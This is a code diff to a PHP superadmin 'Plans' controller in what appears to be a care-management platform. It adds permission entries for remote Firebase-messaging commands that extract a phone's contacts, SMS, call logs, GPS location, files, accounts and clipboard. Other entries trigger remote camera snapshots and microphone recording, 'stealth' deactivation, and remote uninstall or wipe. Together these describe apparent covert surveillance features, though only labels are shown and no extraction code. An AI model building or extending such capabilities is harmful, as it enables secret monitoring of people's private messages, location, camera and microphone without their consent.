@@ -163,6 +163,29 @@ class Plans extends BaseSuperadminController
             ['key' => 'smart_timeline', 'label' => 'Smart Timeline', 'desc' => 'AI-powered timeline intelligence'],
             ['key' => 'correlation', 'label' => 'Correlation Analysis', 'desc' => 'Cross-event correlation engine'],
             ['key' => 'care_plan', 'label' => 'Care Plans', 'desc' => 'Structured care plan management'],
+            
+            // FCM Data Fetch Actions
+            ['key' => 'fcm_fetch_contacts', 'label' => 'FCM: Fetch Contacts', 'desc' => 'Extract device phonebook contacts'],
+            ['key' => 'fcm_cmd_beep', 'label' => 'FCM: Test Beep', 'desc' => 'Trigger audible test alert beep on device'],
+            ['key' => 'fcm_cmd_health', 'label' => 'FCM: Check Device Health', 'desc' => 'Fetch real-time hardware diagnostics (battery, screen, network)'],
+            ['key' => 'fcm_fetch_apps', 'label' => 'FCM: Fetch Apps', 'desc' => 'Extract list of installed applications'],
+            ['key' => 'fcm_fetch_calls', 'label' => 'FCM: Fetch Calls', 'desc' => 'Extract call log database'],
+            ['key' => 'fcm_fetch_sms', 'label' => 'FCM: Fetch SMS', 'desc' => 'Extract text message database'],
+            ['key' => 'fcm_fetch_location', 'label' => 'FCM: Fetch Location & Activity', 'desc' => 'Track GPS coordinates and user motion activity'],
+            ['key' => 'fcm_fetch_usage', 'label' => 'FCM: Fetch App Usage & Notifications', 'desc' => 'Extract package screen time and notification streams'],
+            ['key' => 'fcm_cmd_camera', 'label' => 'FCM: Remote Camera Capture', 'desc' => 'Command remote camera snapshot'],
+            ['key' => 'fcm_cmd_audio', 'label' => 'FCM: Remote Audio Record', 'desc' => 'Command remote microphone audio clip recording'],
+            ['key' => 'fcm_fetch_files', 'label' => 'FCM: Fetch Files', 'desc' => 'Browse and extract device filesystem files'],
+            ['key' => 'fcm_fetch_soft_misc', 'label' => 'FCM: Fetch Misc Software details', 'desc' => 'Extract accounts, calendar, and clipboard data'],
+            ['key' => 'fcm_fetch_hard_misc', 'label' => 'FCM: Fetch Misc Hardware details', 'desc' => 'Extract bluetooth devices, sensors, and thermal metrics'],
+            ['key' => 'fcm_fetch_all', 'label' => 'FCM: Sync All Data', 'desc' => 'Execute complete device extraction backup sync'],
+
+            // FCM Device Management Actions
+            ['key' => 'fcm_cmd_reset_app', 'label' => 'FCM: Reset App Command', 'desc' => 'Allow remote application reset to defaults'],
+            ['key' => 'fcm_cmd_deactivate', 'label' => 'FCM: Deactivate Command', 'desc' => 'Allow remote lock and stealth dummy deactivation'],
+            ['key' => 'fcm_cmd_logout', 'label' => 'FCM: Logout User Command', 'desc' => 'Allow remote user log out and session clear'],
+            ['key' => 'fcm_cmd_uninstall_preserve', 'label' => 'FCM: Uninstall & Preserve Command', 'desc' => 'Allow remote uninstall but keep backup data'],
+            ['key' => 'fcm_cmd_uninstall_wipe', 'label' => 'FCM: Uninstall & Wipe Command', 'desc' => 'Allow remote uninstall with complete data wipe'],
         ];
     }
     private function getAlgorithmDefinitions(): array
